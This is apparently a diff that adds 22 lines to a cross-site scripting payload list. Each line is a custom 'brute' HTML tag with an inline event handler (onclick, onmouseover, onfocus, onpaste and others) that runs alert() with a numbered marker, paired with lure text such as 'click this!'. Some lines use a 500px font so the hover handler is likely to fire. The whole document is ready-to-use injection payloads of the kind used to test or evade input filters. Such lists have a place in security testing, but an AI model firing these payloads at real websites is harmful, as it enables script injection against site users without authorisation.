@@ -1,0 +1,22 @@
+<brute contenteditable onblur=alert(173)>lose focus!
+<brute contenteditable onfocus=alert(180)>focus this!
+<brute contenteditable oninput=alert(181)>input here!
+<brute contenteditable onkeydown=alert(182)>press any key!
+<brute contenteditable onkeypress=alert(183)>press any key!
+<brute contenteditable onkeyup=alert(184)>press any key!
+<brute contenteditable onpaste=alert(190)>paste here!
+<brute onclick=alert(174)>click this!
+<brute oncontextmenu=alert(176)>right click this!
+<brute oncopy=alert(175)>copy this!
+<brute oncut=alert(177)>copy this!
+<brute ondblclick=alert(178)>double click this!
+<brute ondrag=alert(179)>drag this!
+<brute onmousedown=alert(185)>click this!
+<brute onmousemove=alert(186)>hover this!
+<brute onmouseout=alert(187)>hover this!
+<brute onmouseover=alert(188)>hover this!
+<brute onmouseup=alert(189)>click this!
+<brute style=font-size:500px onmouseover=alert(191)>0000
+<brute style=font-size:500px onmouseover=alert(192)>000192
+<brute style=font-size:500px onmouseover=alert(193)>0002
+<brute style=font-size:500px onmouseover=alert(194)>0003
